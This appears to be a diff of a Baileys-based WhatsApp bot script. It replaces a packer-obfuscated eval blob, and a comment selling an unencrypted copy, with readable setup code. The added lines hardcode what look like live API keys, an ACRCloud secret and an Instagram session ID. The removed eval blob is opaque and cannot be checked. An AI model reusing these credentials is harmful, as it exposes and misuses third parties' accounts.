@@ -1,3 +1,10956 @@
-//No enc Rp 30k wa.me/6285156137901
+const
+{
+WAConnection: _WAConnection,
+MessageType,
+Presence,
+MessageOptions,
+Mimetype,
+WALocationMessage,
+WA_MESSAGE_STUB_TYPES, 
+WA_DEFAULT_EPHEMERAL,
+WAMessageProto,
+ProxyAgent,
+ChatModification,
+GroupSettingChange,
+waChatKey,
+mentionedJid,
+processTime,
+prepareMessageFromContent,
+relayWAMessage
+} = require("@adiwajshing/baileys")
+const moment = require("moment-timezone")
+const speed = require('performance-now')
+const request = require('request');
+const { spawn, exec, execSync } = require("child_process")
+const fs = require("fs")
+const axios = require("axios")
+const util = require('util')
+const ffmpeg = require('fluent-ffmpeg')
+const { EmojiAPI } = require("emoji-api");
+const { igApi, getSessionId } = require('insta-fetcher');
+const ig = new igApi("51710311459%3AxVxRS0bOfDTv2X%3A23")
+const emoji = new EmojiAPI()
+const fetch = require('node-fetch');
+const matematik = require('mathjs')
+const PhoneNumber = require('awesome-phonenumber')
+const gis = require('g-i-s');
+const os = require('os')
+const imageToBase64 = require('image-to-base64');
+const yts = require( 'yt-search')
+const ms = require('parse-ms')
+const toMs = require('ms')
+const { error } = require("qrcode-terminal")
+const qrkode = require("qrcode")
+const ameClient = require("amethyste-api")
+const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
+const primbon = require('primbon-scraper')
+const { removeBackgroundFromImageFile } = require('remove.bg')
+const convert = require('imagemagick')
+const ytdl = require('ytdl-core');
+const Download = require("@phaticusthiccy/open-apis");
+const acrcloud = require("acrcloud");
+const { Brainly } = require("brainly-scraper-v2");
+const brainly = new Brainly("id"); 
+const Jimp = require('jimp') ;
+const acr = new acrcloud({
+host: "identify-eu-west-1.acrcloud.com",
+access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
+access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
+});
 
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('W 1g=dj;3V dj(c,d){W GA=iR();E dj=3V(a,b){a=a-tS;Z GB=GA[a];E GB},dj(c,d)}(3V(a,b){W 9v=dj,iS=a();GC(!![]){1Y{W GD=-a9(9v(191))/U+a9(9v(192))/4D*(a9(9v(193))/eO)+-a9(9v(194))/c8*(a9(9v(195))/tT)+a9(9v(196))/mQ*(-a9(9v(197))/tU)+a9(9v(198))/tV+-a9(9v(199))/GE*(a9(9v(19a))/8E)+a9(9v(19b))/mR;if(GD===b)T;Y iS[\'7A\'](iS[\'tW\']())}1P(19c){iS[\'7A\'](iS[\'tW\']())}}}(iR,19d));W{19e:19f,3K,dk,19g,aa,19h,19i,19j,19k,19l,9w,gm,19m,3a,19n,gn,gp}=1L(1g(19o)),6r=1L(1g(19p)),gq=1L(1g(19q)),gr=1L(\'gr\'),{iT,3s,19r}=1L(1g(19s)),fs=1L(\'fs\'),eP=1L(1g(19t)),gs=1L(\'gs\'),8F=1L(1g(19u)),{GF}=1L(1g(19v)),{GG,19w}=1L(1g(19x)),ig=4O GG(1g(19y)),5H=4O GF(),c9=1L(1g(19z)),GH=1L(\'19A\'),6K=1L(1g(19B)),GI=1L(1g(19C)),os=1L(\'os\'),mS=1L(1g(19D)),dl=1L(1g(19E)),ms=1L(\'3l-ms\'),19F=1L(\'ms\'),{dn}=1L(1g(19G)),19H=1L(1g(19I)),GJ=1L(1g(19J)),tX=4O GJ(1g(19K)),9x=1L(\'9x-mT\'),{GK}=1L(1g(19L)),gt=1L(1g(19M)),5l=1L(\'5l-tY\'),tZ=1L(1g(19N)),mU=1L(\'mU\'),{GL}=1L(1g(19O)),gu=4O GL(\'id\'),GM=1L(1g(19P)),u0=4O mU({\'19Q\':\'GN-eu-19R-1.mU.1W\',\'19S\':1g(19T),\'19U\':\'19V\'}),u1=1L(1g(19W))[1g(19X)],GO=1L(1g(19Y))[\'u2\'],mV=4O GO({\'19Z\':\'1a0\',\'1a1\':1g(1a2)}),{1a3,1a4,1a5,u3,GP,GQ,1a6,1a7,1a8,1a9,1aa,1ab,1ac,GR,u4,u5,GS,GT,GU}=1L(1g(1ad)),{gv}=1L(1g(1ae)),u6=1L(1g(GV))[1g(1af)],u7=1L(1g(GV))[1g(1ag)],GW=4O u6({\'1ah\':!![]}),GX=1L(1g(1ai)),do=4O GX(),{GY,8G,u8,mW,7f,u9,ua,7g,1aj,1ak,1al,ub,7h,1am,1an,3W,8H,1ao,GZ,2E,1ap,uc,1aq,mX,H0}=1L(\'./2y/1ar\'),{1E,1as}=1L(1g(1at)),hx=1L(1g(1au)),{7Z,1av,mY,H1}=1L(1g(1aw)),{1ax,1ay,eQ,1az,1aA,1aB}=1L(\'./2y/5l\'),H2=1h[1g(1X)](fs[\'2B\'](1g(1aC))),{H3,ud,H4,ue}=1L(1g(1aD)),eR=1h[\'3l\'](fs[1g(1C)](1g(1aE))),{H5,H6}=1L(1g(1aF)),{mZ,gw,uf,n0,H7}=1L(1g(1aG)),{n1,6s,1aH,ug,6L}=1L(1g(1aI)),{n2,1aJ,1aK}=1L(\'./2y/1aL\'),{1aM,1aN}=1L(\'./2y/1aO\'),2V=1L(1g(1aP)),ui=1L(1g(1aQ)),{H8}=1L(1g(1aR)),6h=1L(1g(1aS)),aR=1L(1g(1aT)),1J=1L(1g(1aU)),{n3,H9}=1L(\'./2y/7i\'),uj=1L(1g(1aV)),{Ha,Hb,Hc,ab,ad,1aW,ae,ag,7j,Hd,ul,He,Hf,Hg,Hh,Hi}=1L(1g(1aX)),{um,un,1aY,1aZ}=1L(1g(1b0)),{Hj,aS,uo,Hk,Hl,Hm,1b1,Hn,up,uq,ur,ut,Ho,Hp,Hq,Hr,iU}=1L(1g(1b2)),eS=1L(1g(1b3)),{Hs,Ht,Hu,uu,Hv,Hw,Hx,Hy,Hz,uv}=1L(1g(HA)),{HB,HC,HE,4Z,5a,gx,iV,8I,n4,8J,9y,9z,HF,n5}=1L(1g(HA)),{HG,HI,HJ,ux,HK}=1L(\'./2y/1b4\'),{HL,HM,uy,HN,HO,n6}=1L(1g(1b5)),{HP,n7,n8,dp}=1L(1g(1b6)),{n9,na,1b7}=1L(\'./2y/1b8\'),{uz,1b9,HQ}=1L(1g(1ba)),{uA,HR,uB}=1L(\'./2y/uC\'),{uD,uE,uF,uG,uH,uI,uJ,uK,uL,uM,uN}=1L(1g(1bb)),{dq,1bc,nb,1bd,1be,HS,HT,HU,HV,ah,HW,HX,HY,HZ,I0,nc,uO}=1L(1g(1bf)),{eT}=1L(1g(1bg)),{8a}=1L(\'./dq/8a.js\'),{uP}=1L(1g(1bh)),{7B,ai,ca,cb,1bi,gy,6t}=1L(1g(1bj)),{9A,gz,3b,aj,5m,gA,6i,1w}=1L(\'./1s/uQ\'),{cc,cd}=1L(\'./1s/uQ\'),3w=1h[\'3l\'](fs[1g(1C)](1g(1bk))),2n=1h[1g(1X)](fs[1g(1C)](\'./7C/2J.3X\')),iW=1h[1g(1X)](fs[1g(1C)](1g(1bl))),{uR,1bm,I1,I2,5n,6j,I3,I4,I5}=1L(1g(1bn)),8K=fs[1g(1C)](1g(1bo)),ce=fs[1g(1C)](1g(1bp)),1bq=fs[1g(1C)](1g(I6)),3D=fs[1g(1C)](1g(aT)),1br=fs[\'2B\'](\'./4E/2q.7k\');aU=3b[1g(I7)],1bs[1g(I8)]=3b[1g(I8)],2C=3b[1g(1bt)],uS=3b[1g(1bu)],aV=3b[1g(1bv)],uT=3b[1g(1bw)],I9=![],iX=3b[1g(1bx)],nd=3b[1g(ne)][1g(1by)],ak=3b[1g(ne)][1g(1bz)],Ib=3b[1g(ne)][1g(1bA)],8L=3b[\'8L\'],8M=3b[1g(ne)][1g(Ic)],gB=![],eU=![],9B=3b[\'9B\'],aW=3b[1g(Ie)],8N=3b[1g(If)],al=3b[1g(Ig)],3Y=3b[\'3Y\'],dr=3b[1g(Ih)],8b=3b[1g(1bB)],uU=3b[1g(1bC)],2q=3b[1g(1bD)];Z 7l=[],8O=[],9C=[],8c=[],8d=[],7D=[],1bE=[],7E=[],6M=[],8P=[],eV=[],gC=[],nf=[];gD=\'-\',ng=\'-\';Z 7i=[];nh=![],5b=3b[1g(1bF)],3B=3b[1g(1bG)],ni=3b[\'Ii\'][1g(1bH)],ds=3b[1g(1bI)][\'ds\'],uV=3b[\'uV\'],5N=3b[\'5N\'],cf=3b[1g(Ij)],3E=\'©\\B\'+2C,aX=3b[1g(1bJ)],8Q=3b[1g(1bK)][\'8Q\'],cg=3b[\'cg\'],gE=!![],am=3b[1g(1bL)],7m=3b[1g(1bM)],4p=3b[1g(1bN)],3t=3b[1g(1bO)],ao=\'uW\',4h=3b[\'1bP\'];W On=\'ᴏɴ\',5z=\'ᴏғғ\';aY=1g(1bQ),aZ=1g(1bR);W Ik=[\'gF-1bS@g.us\',1g(1bT)];3V iR(){W Il=[\'1bU\',\'1P\',\'1bV\\2M\\1bW\\2z\\7n\\I\\I@\',\'9D\\1bX\\gG\\6k\\eW\\aq\',\'uX\',\'\\I⬡\\B*1bY\\B:*\\b0://wa.me/\',\'3B\',\'&1E=Im\',\'\\1bZ:\\B\',\'ᴘʀᴏғɪʟᴇ\',\'\\B@b1\\eX\',\'./2y/2V\',\'iY\',\'1I://b2\',\'./2y/1E.js\',\'Oh\\uY\\nj\\3Z\',\'eY\\3m\\eZ\\B\',\'./5O/vn.3X\',\'8e\\8f\\3L\\b3\\B\',\'6N\\3M\\1c0\\1c1\\nk\\b4\\eX\\uZ\',\'1c2\',\'v0\',\'1c3\',\'1I://ar.b5.1W/\',\'1c4\',\'5A\\5c\\3L\\9E\',\'In\\iZ\\nl\',\'2B\',\'4F\\b6\\1c5\',\'1c6\\4i\\6u?\',\'b7\',\'gH\',\'1c7\',\'1c8\',\'v1...\',\'v3\',\'+80+1c9\',\'1ca\',\'❒\\B*「\\gI\\j0\\B」*\\B❒\\B\\I\\B\\B\\I\\B*f0\\B:\\B\',\'1cb\',\'1cc\',\'1w\',\'Io\\1cd\\I\\I\',\'iY\\4a\',\'b8\',\'v4\',\'1ce\',\'1cf\',\'Ip\\f1\\v5\\1cg\',\'1ch\',\'1ci\',\'1cj\',\'1ck\',\'Iq\',\'6O\',\'1cl\',\'5o\\4P\\8g\\b9\\2M\\3m\\1H\\B\\gJ\\5I\\4P\\8g\\dt\\5d\\b9\\2F\\4j\',\'j1\',\'j2\\j3\\j4\\j5\\7F\\ch\\B:\\B\',\'\\eX\\I\\v6\\6P\\6v\\B=\\1cm\',\'./5O/gK/\',\'ᴄᴇᴋ\\Bᴘʀᴇᴍ\',\'2\\du\\5P\',\'1cn\',\'v7\',\'1co\',\'1cp\',\'8R\',\'1cq\',\'v8\',\'as\\1cr\\ci\\B:\\B\',\'v9\\B@1cs|Ir|Ir\\cj\',\'Is-it\',\'\\1ct\\5Q\\ck\\va\',\'\\nm\\2M\\1x\\cl\\gG\\1cu\\It\\vb*vc*4Q\\I\\f2:\\B\',\'9\\at\\5P\',\'7o\',\'1cv\',\'\\I\\I\\I\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\',\'1cw\',\'1cx\',\'eS\',\'\\1cy\\B:\\B\',\'5H-3x\',\'\\1cz\\1cA............\\B\',\'*Id*\\B:\\B\',\'11\\at\\5P\',\'nn\\Iu|1cB\',\'\\I\\I•\\1cC\\1cD\\cm\\ba\\B:\\7G\\Iw\\cm\\ba\\gL\\B:\\7G\\1cE\\cm\\gM\\gI\\B:\\7G\\1cF,vd\\I\\j6\\B:\\no\\np\\ba\\7H\\B\',\'bb\\Ix\',\'\\B:v\',\'nq\\ve\\vg\\nr\\1x\\vh\\3N\',\'vj\',\'1cG\',\'*Iy\\B:*\\B\',\'1cH\\Iz\\3O\\1cI\\bd,\\1x\\j7/1cJ\\j7\\gN\\2F\\5I\\2o\\IA\\1cK?(1cL\\1cM/1cN\\IB)\',\'3\\at\\5P\',\'vk\',\'\\dv\\B\',\'1cO\',\'aU\\4G\',\'\\6w\\6l\\ns\',\'mV\',\'IC\\9F\',\'+128+129\',\'@1cP/1cQ\',\'1cR\\1cS\\IE\\IF\\IG\\nt\\1cT\\nt\\1cU\\1cV\\B:v\\1cW\\I#1cX\',\'IH\',\'\\I\\nm\\f3\\np\\6v\\3L\\B\',\'\\B-8S:a\\B\\1cY=\',\'II\\IJ\\aq\\6Q\\IK\\vl\\IL\\B:v\',\'aS\',\'IM\\gN\\1H\\B?\\8h\\vo\\vp\',\'1cZ\',\'f4\\6R\\B?\\7I\\B:\\8T\\5d\\dw\\nu\',\'1d0\',\'5A\\1d1\\IN\',\'1d2\',\'j8\\B@b1\\3O\\8U\\3O\\cp\\6l\\8V\\2F\\f5\\1x\\6S\',\'nv\\3M\\1x\\gO\\4i\',\'nw\',\'FN:\',\'/v/nx.1d3-24/1d4.f6?IO=11-4&oh=1d5&oe=1d6\',\'1d7\',\'ny\\vq\\j9\\nz\\nA\\1d8\\f7\\6k\\1d9\\aq!\',\'IP\\eW\\6k\\1H,\\6x\\3N\\1da\',\'f8/ja\',\'*jb*\\B:\\3Z\\5d\',\'IQ\',\'9D\\dx\\bf\\nB\\8i\\f9\\dy,\\nC\\nD\\fa\\jc\\gP\',\'1db\\1dc\\IR\',\'IP\\8T\\jd\\1dd\\B🙂\',\'nE\',\'1de\\1df\\1dg😗\',\'IS\',\'1dh\',\'8j\',\'ᴍʏ\\Bᴘʀᴏғɪʟᴇ\',\'+140+153\',\'f8/1di\',\'as\\IT\\I\\I\',\'1dj\',\'1dk\',\'1dl\',\'[()+-/\\B+/]\',\'1I://i.IU.co/IV/IW-IX-IY-v4.bh\',\'nF\\1dm\',\'1dn\',\'1I://2V.me/8W-fc-IZ-av-1do.5R\',\'4q\\va\',\'1dp\\1dq\\nG\\B🤣\',\'5B\\1dr\\J0\\3m\',\'7p:\\nH\\1ds\',\'1I://\',\'./2y/vr\',\'vs\',\'./2y/gQ\',\'\\I*1dt\\B:*\\B\',\'1du\\2F\\2o\\J1\\nI\\cq\\dz\\1dv\\8V\\nJ\\B:(\',\'*as\\1dw\\J2*\\ci\\B:\\B\',\'1dx\',\'1dy\',\'1dz\',\'fd/nK\',\'J3\\1dA\\B\',\'6N\\3M\\6S\\9F\\4i\',\'1dB\',\'1dC\',\'3Y\',\'1dD\',\']─\\B「\\B*J4\\nL\\nM*\\B」\\B─[\\I\\nN\\B:\\B\',\'*gR\\1dE\\1dF*\\dA\\bi\\2o\\9E\\je\\B:\\7G\\B\',\'./4E/2q.7k\',\'fe\\4G\',\'J5\\jf\\vu\\nO\',\'6N\\3M\\cl\\bk\',\'vv\',\'jg\',\'2G\\nP\\5S\\jh\',\'J6\',\'1dG\',\'1dH\',\'\\I📉\\ba\\B:\\B\',\'1dI\\ff\',\'9G\\B:\\I*\',\'2G\\4k\\fg\\2z\\B\',\'2G\\vw\\ji\\vx\\2z\\B\',\'6N\\vy\',\'J7\\4G\',\'2G\\4k\\nQ\\dw\\2z\\B\',\'8e\\dB\\B\',\'1dJ\',\'gu\',\'jj\\1dK\\1dL\\1dM\\1dN?\\J8\\jk\\8k\\gN?\\1dO\\1dP\\1dQ?\',\'\\I📂\\vz\\B:\\B\',\'J9\',\'\\dx\\vA!\\I\\I\\B*vB\\B:*\\B\',\'iX\',\'bl,\\1dR\\1dS,\\bm\\ax\\1dT\\dt\\3H.\',\'Ja?\',\'*Jb\\bn\\1x\\vC\\nR\\gS\\vD\\3H\\Jc*\\B\\B🙂\\B@\',\'nv\\3M\\1x\\4i\\vE\',\'1dU\',\'*1dV\\5c\\jl\\1dW\\Jd*\',\'1dX\',\'\\fh\\I\\nS\\gT\\B:\\7G\\B\',\'./2y/eS\',\']─\\B「\\B*1dY\\nL\\nM*\\B」\\B─[\\I\\nN\\B:\\B\',\'1dZ\',\'1e0\',\'\\vF\',\'1e1\',\'Je\\1H\\B?\',\'6m\',\'\\gM,\\B\',\'1e2\',\'18:4R\',\'1e3\',\'1e4\',\'cr\\cs\\8l\\B\',\'1e5\',\'ᴏᴡɴᴇʀ\',\'Jf\',\'\\1e6\\5Q\\1e7\\gU\\B*\',\'Jg\',\'1e8\',\'ᴅᴏᴄᴜᴍᴇɴᴛ\',\'\\I*G\\1e9\\vG\\1ea\\1eb\\Jh\\Ji\\1ec\\vG*\\I*1ed\\B:*\\B\',\'*\\B」\',\'[Jj]\\B:\\B%s\',\'\\1ee\\B:\\B\',\'\\I*Gc\\1ef\\Jk*\\B:\\B\',\'gV\',\'*1eg...*\',\'2G\\1eh\\gP,\\dC\\2o\\f3\\6w\\6l\',\'&1E=Jl\',\'2G\\4k\\1ei\\Jm\\2z\\B\',\'\\I*1ej\\B:*\\B\',\'./2y/ui.js\',\'1ek\',\'18:4R:4R\',\'nT\\1el\',\'vH\\nI\\4j\\ax\\3H\\1em\',\'nU\\4j:v\',\'5\\bo\\3H\',\'4r\\1x\\vC\',\'@g.us\',\'1en\',\'2\\bo\\3H\',\'1eo-2J\',\'1ep\',\'&lc=id\',\'1eq\',\'+62\',\'1er\',\'Jn\\bn*\',\'7i*\\B@b1\',\'Ga\\bd\\ff,\\nV\\Jo\',\'Jp:3.0\\I\',\'fi\\2M\\1x\\8g\\gG\\nW\\4j\',\'ct\',\'*Jq\\1es*\',\'1et\',\'4q\\gW\\3O\\nX\',\'vI\',\'\\fh\\1x\\nY\',\'4F\\gX\\1eu\',\'./2y/1J/7l.js\',\'vJ\\4G\',\'1ev\',\'4Q[\\B!\\B]\\cu\\Jr\\bf\\Js\',\'cv\',\'vK\\3N\\Jt\\9F\',\'5b\',\'1ew\',\'5o\\Ju\\2M\\1x\\7q\',\'nZ\',\'1ex\',\'vL\',\'\\1ey\\B:\\9H.me/\',\'gY\\5e,\\vM\\cw-9\\5Q\\1ez\\B-,\\B+,\\B*,\\B/,\\B×,\\B÷,\\Bπ,\\1eA,\\B(,\\B)\\2F\\1eB\',\'Jv\',\'1I://bp.1W/fj?v=\',\'1eC/1eD\\o0\\vN/1eE\',\'\\I💦\\1eF:\\B\',\'1eG\',\'1eH\',\'1eI\',\'1I://vO-vP.vQ.1W/5J?q=vR:vS&vT=vU\',\'\\I📄\\Jw\\B:\\B\',\'4q\\3O\\o1\\8m\\o2\',\'1eJ\',\'1eK\',\'1I://b2.2l.1W/\',\'1eL\',\'1eM\',\'1eN\',\'vV\\jf\\7n,\\o3\\vW\',\'5o\\4P\\nH\\2M\\1x\\7q\',\'1eO\',\'Jx\',\'3x\',\'Jy\',\'vX\\Iu\',\'1eP\',\'Jz/JA=\',\'fk\',\'1eQ\',\'1eR\',\'vY\\4a\',\'1eS\\vZ\\o4\',\'1eT\',\'1eU\',\'1eV\',\'JB\',\'iU\',\'1eW\',\'2G\\4k\\jm\\2z\\B*「\\B\',\'1eX\',\'JC\\bk\',\'\\I🎐\\1eY:\\B\',\'1eZ\',\'JD\',\'./7C/gz.3X\',\'./2y/5m\',\'\\B\\B」\',\'2N\\6w\\JE\\ji\\nX\\B\',\'&1E=ct\',\'fl\\B@\',\'1N\',\'1f0\',\'JF\',\'8F\\B-i\\B\',\'1f1\',\'\\I🌐\\JG\\1f2\\B:\\B\',\'8X\',\'1f3\',\'Ga\\jd\\JH\\ff\\nV\\1f4\',\'1f5\\3M\\3M\',\'1f6\',\'1f7\',\'1f8\',\'5A\\8m\',\'o5\',\'4h\\w0\',\'1I://2V.me/8W-1f9-fc-o6-av-1fa.5R\',\'\\2z\\8m\\B\',\'\\2M\\1x\\8g\\ay\\JI\\gG\\nW\\4j\',\'w1\',\'JJ\',\'8Y\',\'\\JK\\JL\',\'\\f2:\\B\',\'1fb\\1fc\\1fd\',\'1fe\',\'2T\',\'\\1ff\\B:\\B\',\'o7\',\'w2\\7F\\5c\\b0://2l.1W/\',\'./1s/1fg\',\'w3\',\'1fh\',\'JM\\4s\\gZ\\jn\\IT\',\'5A\\5c\\1fi\',\'1fj\',\'*w4*\\B\',\'o8\',\'JN\\w5\\JO\\1fk?\',\'1fl\',\'8e/bq\\8f\\3O\\dD\\3L\\b3\\B\',\'&1fm=1fn&1fo=1fp\',\'?JP=\',\'&1fq=1fr\',\'5B\\Jt\\bk\\bs!\',\'w6\\8V\\2F\\3M\\1fs\\JQ\',\'vJ\',\'1ft\',\'*bt\\o9*\\I\\I\',\'*jb\\JR\\ay*\\B:\\B@\',\'JS\',\'1fu\\JT\\B*\',\'w7\\4G\',\'\\I\\B\\B\\B\\JU\\B:\\9H.me/\',\'bl\\oa\\jo\\jh\\3L\\jq:\\B*JV\\ob\\oc\\4i\\ob-JW\\3N*\',\'JX\\jr\\og\\6S,\\1fv\\6S\\B😋\',\'oi\',\'6T\',\'1fw\',\'4Q*jt\\1fx*4Q\',\'4q\\3O\\ck\\ju\',\'J5\\jf\\vu\\1fy\',\'1fz\',\'\\I*JY*\\B:\\B\',\'jv\',\'1I://2V.me/JZ-2T-8n-1fA.5R\',\'*1fB\\1fC\\8Z*\',\'1fD\',\'\\5C|9I\',\'K0\\B<9I>\',\'1fE\',\'dq\',\'8️⃣\',\'1fF\',\'\\I🌏\\K1\\B:\\B\',\'5B\\bf\\w8\\jw\\fa\\8Z!\',\'1fG\',\'1fH\',\'bu\',\'K2\',\'w9;1e=K3;1e=K4;wb=\',\'ub\',\'1I://ar.jx.1W/wc/\',\'1fI\',\'&1fJ=1fK\',\'K5\',\'1I://3x.1fL.1fM/2J/2.5/K6?q=\',\'1fN\',\'wd\',\'7J\',\'we\',\'vJ\\4a\',\'\\I👤\\oj\\B:\\B\',\'\\5C\',\'1I://2V.me/8W-K7-fc-K8-av-1fO.5R\',\'fm\',\'ok\',\'1fP\',\'K9\',\'7D\\ve\\vg\\nr\\1x\\vh\\3N\',\'Ka\',\'1fQ\',\'wf\\1H\\B\',\'Kb\',\'\\2M\\1x\\8g\\ay\\9F\',\'1fR\',\'1fS\',\'1fT\',\'\\B❤️\\B@\',\'b5.1W\',\'1fU\',\'Kc*\\5C\',\'*jy\\jz*\\I\',\'1fV\',\'1fW\',\'1fX\\ol\\1fY\\Kd!\',\'*1fZ\\bn\\1g0\\9J*\',\'4q\\Ke\',\'1g1\',\'4F\\b6\\oo\\fn\',\'6t\',\'4S\',\'1I://1g2.1g3/3x/v2/1g4/\',\'2N\',\'Kf\',\'wg\\B-wh\\wi\\B./7o/2J.do\\B./7o/\',\'3P\',\'©1g5\',\'1g6\',\'1g7\',\'./dq/uP.js\',\'1g8\',\'1g9\',\'1ga\',\'wj\',\'2G\\1gb\\b9\\B「\\B*\',\'1gc\',\'./4E/1gd.3c\',\'2G\\4k\\1ge\',\'1gf\\Kg\\6x\',\'\\B-8S:a\\B\\Kh=0.8,jA=1gg\\4t\\B\',\'Ki=\',\'1gh\',\'4q\\ju\\1H\',\'1gi\\1gj\\6R\\1H?\',\'\\1x\\Kj\\4j\',\'1gk\',\']─\\B「\\B*1gl\\nL\\nM*\\B」\\B─[\\I\\nN\\B:\\B\',\'op\',\'1gm\',\'Kk\\1gn\\wk\\7K\\2z\\5e\\5S\\1go\',\'Kl\',\'Km\\8T\\1gp,\\ax\\3H\\7L\\B^4Q^\\B\',\'wl\',\'>\\Kn\',\'1gq\\Ko\\B\',\'jj\\jB\\8k\\8V\\5Q\\1gr\\8V\\7F\\jB\\8k\\2o\\cj?\',\'1gs\',\'az?\',\'wn\',\'\\I*Kp\\B:*\\B\',\'wo\',\'4F\\1gt\',\'./7C/aj.3X\',\'2G\\nY\\B\',\'./2y/Kq\',\'Kr\\Ks\\4s\\Kt\\B\\1gu\\1gv\\4s\\3Z\\Kt\\I-1gw\\1gx\\wq\\I\\1gy\\B=\\B✅\\1gz\\B=\\B❌\\I\\1gA:\\B\',\'*cx\\bi\\2o\\9E*\\9a\\B:\\B\',\'1gB\',\'1gC\',\'1gD\',\'1gE\',\'\\B\\Ku\\B:\\7G\\B\',\'\\I🌈\\1gF:\\B\',\'h0\\I\\oq\\cy\\or\\B=\\8o\\ot\\B=\\7M\\ou\\B=jC\',\'fo://h1-3x.7N.1W/jD?2T=\',\'wr\\ws\\1gG\\ov\\j9\\Kv\\Kw\\Kx\\1gH?\',\'1gI\',\'1I://bp.1W/wt/\',\'1gJ\',\'4r\\1x\\Ky\\1gK\\1H\',\'\\I👤\\1gL:\\B\',\'1I://h2.be/1gM\',\'2G\\1gN\\B\',\'Kz\',\'KA\\B:\\B\',\'./2y/uj\',\'\\I⏰\\h3\\B:\\B\',\'.\\1gO:\\B\',\'1gP\',\'1gQ\',\'gq\',\'1gR\',\'5f\',\'1gS\',\'1gT\',\'1gU\',\'9b\',\'jE\',\'2N\\6w\\7n:\\I\',\'KB\\KC\\1gV\\1gW\',\'wu\',\'./4E/9K.aA\',\'1gX+1gY/1gZ=\',\'1h0\',\'KD\',\'1h1\',\'2G!\',\'4u\',\'2G\\4k\\h4\\KE\\1h2\',\'jF\',\'*KF\\cy*\\6Q\\1h3\\ay\\aq\\B\\B@\',\'1h4\',\'KG\',\'KH\\gI\',\'u3\',\'KI\',\'1.\\1h5:\\B\\I\',\'1h6\',\'\\B=\\B\',\'wv\\5c\',\'KJ\',\'*as\\KK*\\jG\\B:\\B\',\'\\1h7\\1h8\\h5\\cz\\1h9\\2o\\1ha,\\ow\\5I\\B\\1hb\\cz\\aB\\1hc\\nG,\\KL\\3S\\1x\\1hd\\1he\\5I\\1hf\\2z\\KM,\\1hg\\KN\\1hh\\1hi\\ox\\gZ\\1hj\\1hk\\I\\I\',\'*ww\\h6\\1H,\\1hl\\cj\\1x\\wx*\\B😁\',\'\\j6\\B:\\1hm\\Jo\\1H\\3O\\3M\\cj\\I\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\6l\\wy\\6Q\\h7\\3m\\I\\I©\\B\',\'1hn\',\'20:10\',\'1ho\',\'*jb\\JR\\ay*\\B:\\B-\',\'vH\\1H\\aC\\aB\\3Z\\5d\\1x\\oz\',\'9G\\B:\\I\',\'KO\',\'1hp\',\'1hq\',\'jH\\4G\',\'nF\',\'1I://3x.jI.1W/1hr/\',\'12:10\',\'1hs\',\'1ht\',\'1hu\',\'9c\',\'./7C/1w.3X\',\'\\I\\I*1hv\\2F\\1hw*\\I\',\'\\B\\I「\\gW\\B」\\B\',\'1hx\',\'1I://KP.KQ.1W/KR/1hy-1hz/1hA/KR-1hB-KS-iU.1hC\',\'KT\',\'1hD\',\'f0\\h8\\6u\',\'1hE\',\'KU\',\'1hF\',\'wz\',\'1hG\',\'1hH\',\'oA\',\'cA\',\'wA\',\'jJ\',\'\\KV\\gL\\B:\\B\',\'\\B-KW\\B\\4t[0:v]KX=0.5*KY[v];[0:a]KZ=2[a]\\4t\\B-7O\\B\\4t[v]\\4t\\B-7O\\B\\4t[a]\\4t\\B\',\'u2\',\'\\ox\\cq\\1hI\\I\\wB\\1hJ\\4s\\cq\\B👊\\wB\\Ji\\4s\\L0\\B👎\\wB\\B\',\'\\1hK\\1hL\\Kn\',\'./5O/gK.3X\',\'1I://jK.7N.1W/3x/vj?9I=\',\'L1\',\'1hM-1hN\',\'./4E/oB.3c\',\'1hO\',\'L2\\L3\\5c\\6Q\\nJ,\\L4\\L5\\h6\\jL\\6S\\B😆\',\'./1hP.7k\',\'ᴍᴇss\',\'8p\',\'*as\\cu*\\jG\\B:\\B\',\'1hQ\',\'2G\\4k\\1hR\\2z\\B\',\'wv\\5C!\',\'wC\',\'1hS\\3Z\\L6!\',\'op\\4G\',\'4r\\1x\\Ky\\L7\\1H\',\'1hT\\jB\\8k\\gN\\h6?\\oC\\1hU?\',\'1hV\',\'ᴅᴀsʜʙᴏᴀʀᴅ\',\'5B\\fg\\2M\\3m\',\'1hW\',\'L8\',\'5A\\5c\\L9\\1H\',\'2N\\dE\\La!\',\'1hX\',\'1hY\',\'Lb\\aB\\h7\\Lc\\cy\\fp\',\'2G\\4k\\wD\\2z\\jM\',\'1I://wE.2l.2v/d/f/1hZ-1i0.f6\',\'4r\\b4\\1i1\\cB\\3M\\Ld\\Le\\1H\\B😄\',\'Lf\\wF\',\'&1E=wo\',\'wr\\1i2\\3L\\b3,\\6x\\Lg\\1i3\',\'Lh\\1i4\\Li!\\h9\\9F\\dF\\1i5\\gI\\1i6!\',\'gB\',\'11:10\',\'2N\\wG\\Lj\\Lk\\3L\\Ll\\B\',\'\\I\\B\\B\\B\\B📅\\Jk\\B:\\B\',\'[1i7]\',\'1i8\',\'Lm\',\'*1i9*\\I\',\'1ia\',\'nv\\3M\\1x\\4i\',\'\\I\\1ib:\\B\',\'1ic\',\'8\\at\\5P\',\'ғᴛᴇxᴛ\',\'1I://3x-1id.7N.1W/oD?2T=\',\'-jN\',\'6\\du\\5P\',\'K6\',\'1I://ar.jx.1W/wc/1ie-1if/?Ln=Lo\',\'Lp\\5c|4l|jO|9I\',\'1I://2V.me/jg-2T-8n-av-1ig.5R\',\'wH\',\'4q\\gW!\',\'1ih\',\'cC\\ha\',\'oy\\B?\',\'\\B-KW\\B\\4t[0:v]KX=2*KY[v];[0:a]KZ=0.5[a]\\4t\\B-7O\\B\\4t[v]\\4t\\B-7O\\B\\4t[a]\\4t\\B\',\'Lq\',\'1I://i.oE.1W/vi/\',\'*\\I\\1ii\\